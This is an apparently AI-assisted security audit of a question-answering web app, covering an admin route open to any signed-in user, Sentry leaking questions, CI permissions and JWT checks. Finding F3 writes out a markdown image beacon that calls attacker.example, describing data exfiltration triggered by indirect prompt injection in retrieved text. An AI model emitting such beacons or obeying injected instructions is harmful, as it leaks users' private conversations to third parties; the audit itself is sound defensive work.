# Security audit, October 2026

> **Disclaimer.** This is an AI-assisted audit (Claude Code, one session, 2026-10-16) of code the owner authorized it to read, plus passive GET/HEAD checks of shelah.org and active tests against a local instance with mocked providers. It is **not** a licensed penetration test, carries no assurance, and covers only what is listed below. Section 5 says what was *not* covered. It does not replace or overwrite [`AI_SECURITY_REVIEW.md`](AI_SECURITY_REVIEW.md).

Method: attack-surface map (routes × auth class), then category by category; each finding below was proven by a local test or an exact code path. Unsubstantiated suspicions were dropped. No secret values were read or recorded; locations only. Production was touched with GET/HEAD only; no AI route was called.

## 1. Findings

| ID | Severity | Title | Status |
|----|----------|-------|--------|
| F1 | **High** | `/api/devtools/feedback-digest` readable by any signed-in account | Fixed |
| F2 | **Medium** | Sentry captured stack-frame locals, including the user's question | Fixed |
| F3 | **Medium** | Markdown images in AI answers allow data-exfil beacons (CSP `img-src https:`) | Fixed (client) |
| F4 | Low | CI workflows had no `permissions:` block | Fixed |
| F5 | Low | JWKS verification is synchronous inside async paths | Open (described) |
| F6 | Low | `check_and_reserve_user_budget` has no explicit `REVOKE` from `anon`/`authenticated` | Open (SQL to run) |
| F7 | Low | Other `/api/devtools/*` and `/api/stack/health` routes accept any signed-in account | Open |
| F8 | Info | Clerk `aud` is only checked when `CLERK_AUDIENCE` is set | Open (documented) |
| F9 | Info | bandit B324 (`sefaria_library.py:158`, hash used as a cache key) | Open (cosmetic) |

### F1 (High): feedback digest readable by any signed-in user
- **Where:** `backend/routes_devtools.py` `feedback_digest` (was `@require_clerk_auth` only).
- **Impact:** `require_clerk_auth` proves *an* account, not *the operator*. Any person who signs up could `GET /api/devtools/feedback-digest?limit=200` and read every reader's free-text feedback comments and row metadata (`select("*")`). The docstring called it "auth-gated"; that held only against anonymous callers.
- **Proof:** `tests/test_security_audit_2026_10.py::test_f1_*`. Before the fix an ordinary `sub` got 200; now 403.
- **Fix:** `_is_admin_user()` checks the Clerk `sub` against `ADMIN_USER_IDS` (comma-separated). Fails closed when unset. **Operator action:** set `ADMIN_USER_IDS` in Vercel to your Clerk user id, or the digest returns 403 for everyone (including you).

### F2 (Medium): question text in Sentry events via stack-frame locals
- **Where:** `backend/logging_setup.py` `_build_sentry_init_kwargs`. `_scrub_error_context` redacts only *context keys*; the SDK's default `include_local_variables=True` attaches frame locals separately.
- **Impact:** any exception inside `ask_async` (`asgi.py`, e.g. `payload`, `question` locals) shipped the raw question to Sentry, contradicting the privacy posture (`send_default_pii=False`, medical/marital questions).
- **Proof:** a local probe with a capturing transport found the question at `stacktrace.frames[0].vars.payload`, `.vars.question` and `frames[1].vars.a[0]`. Regression: `test_f2_question_never_reaches_sentry_event` (end to end through `/ask`) and `test_f2_sentry_kwargs_disable_local_variables`.
- **Fix:** `"include_local_variables": False`.

### F3 (Medium): image beacon exfiltration through AI answers
- **Where:** `static/js/shell.js` `renderAnswerMarkdown` (DOMPurify with the HTML profile allowed `<img>`); CSP `backend/csp.py:117` has `img-src 'self' data: https:`.
- **Impact:** an indirect prompt injection in retrieved text (Sefaria/Wikipedia/web) or a user-memory could make the model emit `![](https://attacker.example/c.png?q=<conversation text>)`. The browser fetches it on render, leaking text to a third party with no click. Requires a successful injection first, hence Medium. `retrieval_guard` is a phrase heuristic and not a guarantee.
- **Fix:** `FORBID_TAGS` (`img`, `picture`, `source`, `video`, `audio`, `form`, `input`, `textarea`, `button`, `select`, `style`, `link`, `meta`, `iframe`, `object`, `embed`, `svg`, `math`) on the answer sanitizer; `static/min` rebuilt. Regression: `test_f3_answer_renderer_forbids_beacon_tags` (static check of the source; a real-browser run was **not** done, see §5).
- **Cross-lane note:** this touches frontend JS. Defense in depth still open: stripping `![...](http...)` server-side in `backend/claude.py::_sanitize_model_output`, and narrowing `img-src` to the hosts actually used.

### F4 (Low): workflows without `permissions:`
`ci.yml` and `rls-verify.yml` inherited the repo default token scope. Both now declare `permissions: contents: read`. Actions were already pinned by SHA. Test: `test_f4_workflows_declare_least_privilege`.

### F5 (Low): sync JWKS lookup on the event loop
`backend/auth.py:58` (`get_signing_key_from_jwt`) and the sync `extract_user_id_from_bearer_value` call from `RateLimitMiddleware` (`backend/rate_limit.py`, llm/account classes) can block the loop on a cold JWKS fetch. Not fixed (touches the hot path of every `/ask`). Suggested: wrap in `asyncio.to_thread` at the two async call sites, keeping the JWKS cache warm at startup.

### F6 (Low): budget RPC grants
`scripts/sql/check_and_reserve_user_budget.sql:123` revokes only from `PUBLIC`; Supabase's default privileges grant `EXECUTE` to `anon`/`authenticated` directly. The function is not `SECURITY DEFINER` and `ai_usage_log` has RLS enabled with no policy (`docs/DATABASE.md:157,384`), so an anon caller's insert should be denied by RLS. I could not verify the live grants (no DB access by design). Suggested one-liner, safe because only the service role calls it (`backend/cost_meter.py`):
```sql
REVOKE EXECUTE ON FUNCTION public.check_and_reserve_user_budget(TEXT, TEXT, NUMERIC, NUMERIC) FROM anon, authenticated;
```

### F7 (Low): other devtools routes
`stack_health`, `reliability` and `api_health_alias` reveal rate-limit thresholds and configuration state to any signed-in account. Same remedy as F1 (`_is_admin_user`); not applied because it changes the behaviour of scripts that call them (`scripts/verify_integrations.py`).

### F8 (Info): audience
`_verify_clerk_token` pins `algorithms=["RS256"]`, verifies `exp` and `iss`, and checks `aud` only when `CLERK_AUDIENCE` is set. Memory records that the dev Clerk template lacks `aud`, so this is understood. Forged-token matrix (alg `none`, HS256 key-confusion, expired, wrong issuer) is rejected: `test_jwt_forgeries_rejected`; valid RS256 accepted.

### F9 (Info)
bandit's other hits were reviewed and are false positives or non-security (test helpers, fixed-host URL building). `sefaria_library.py:158` could pass `usedforsecurity=False`.

## 2. OWASP Top 10 (2021) mapping

| # | Verdict | Evidence |
|---|---------|----------|
| A01 Broken access control | F1/F7 found. Otherwise sound: history GET/DELETE filter by owner in the query (`backend/routes_user.py:450-505`, `backend/device_identity.py:170`), 404s on both missing and not-yours; UUID-validated ids; share/conversation routes owner-scoped; cron routes use `hmac.compare_digest` and fail closed with 503 | tests + read |
| A02 Cryptographic failures | TLS via Vercel; device id stored as `device:<sha256>`; Svix webhook verification constant-time; no secrets committed (gitleaks clean over 622 commits) | scans |
| A03 Injection | SQL goes through PostgREST/supabase-py (parameterised); the one plpgsql function whitelists its `p_key_column`; SSR text pages use a parser-based sanitizer and `tojson` embedding (`backend/text_ssr.py`); answers sanitized by DOMPurify (F3) | read |
| A04 Insecure design | Guest cap + per-class rate limits; llm class fails closed if Redis is down; budget gates and Gemini cooldown exist. Anonymous `/ask` is an accepted risk (§3) | read |
| A05 Misconfiguration | CSP with per-response script hashes; `form-action 'self'`; see F3 for `img-src`; no open redirect found passively (incl. the vercel.app redirect) | prod GET/HEAD |
| A06 Vulnerable components | `pip-audit`: no known vulnerabilities; `npm audit`: 2 moderate, both dev-tool advisories, not shipped | scans |
| A07 Authn failures | JWT matrix in F8; no password handling in-app (Clerk) | tests |
| A08 Integrity failures | Actions pinned by SHA; lockfiles committed; FullCalendar SRI; F4 | read |
| A09 Logging/monitoring | F2 fixed; Sentry `send_default_pii=False`; rate-limit and error-bot alerting exist | probe |
| A10 SSRF | **Not applicable as exploitable:** every outbound host in `backend/utils/search_provider.py` and the library proxies is a constant; user input reaches only path/query components (quoted) | read |

## 3. Accepted risks (not re-raised; no new evidence)
- `CLERK_ENFORCE_AUTH=false` in production: anonymous `/ask` is open on purpose, compensated by the guest cap and rate limits.
- WAF rule 3 stays on Log (Deny breaks PUT/PATCH/DELETE).
- `anon` has no SELECT on `answer_feedback` by design (42501 is not a missing grant).
- RLS Live Verification workflow failures are stale Clerk session ids, not an RLS regression.
- Turnstile is built but off.

## 4. Verified-good (short)
Service worker: private API prefixes (`/api/user/`, `/api/auth/`, `/api/conversations`, `/api/public/answer`, …) are excluded from caching, non-GET is skipped, and `message` events require same origin (`static/service-worker.js:46-67,362-379`). Cache tiers keep `/api/public/answer` at `no-store`. Admin-ish crons compare secrets in constant time.

## 5. What could NOT be tested, and why
- **Production behaviour behind login**, real Clerk/Supabase/Vercel/WAF dashboard configuration, actual grants on live Postgres (F6), and Sentry project settings: out of reach by the ground rules.
- **A real browser exfil run** for F3 (the fix is verified by source check, not by rendering a hostile answer).
- **Rate-limit and guest-cap behaviour under load or header spoofing on prod**: forbidden. The header order (`X-Vercel-Forwarded-For` first) is trustworthy only because Vercel overwrites those headers; not verified here.
- **Real prompt-injection success rates** against Gemini/Claude: would cost provider budget. Only the code paths (`retrieval_guard`, tool gating) were read.
- **Not read in depth this pass:** Flask `/ask` in `app.py`, `cost_gates.py`/`health_check.py` cooldown internals, `routes_privacy.py` retention enforcement, sitemap/`llms.txt`, and a line-by-line re-verification of every claim in `AI_SECURITY_REVIEW.md`. Treat these as unaudited, not as clean.
- Graph and docs were consulted via grep and direct reads; no graphify queries were run for flow tracing.

## 6. Test-suite state
Full suite: 5427 passed, 1 failed. The failure, `tests/test_gemini_cooldown.py::TestOpeningTheCircuit::test_checking_gemini_never_touches_the_network`, also fails on a clean `HEAD` (checked with the audit changes stashed), so it predates this audit; it belongs to the unpushed Gemini-cooldown work (`f2a63d5`). `ruff check` is clean.

## 7. Fix summary
`backend/routes_devtools.py` (F1), `backend/logging_setup.py` (F2), `static/js/shell.js` + `static/min/` (F3), `.github/workflows/*.yml` (F4); tests in `tests/test_security_audit_2026_10.py`, plus `tests/test_routes_devtools.py` (sets `ADMIN_USER_IDS` for the digest class). New env var `ADMIN_USER_IDS` (add to `docs/ENVIRONMENT.md` when merging).
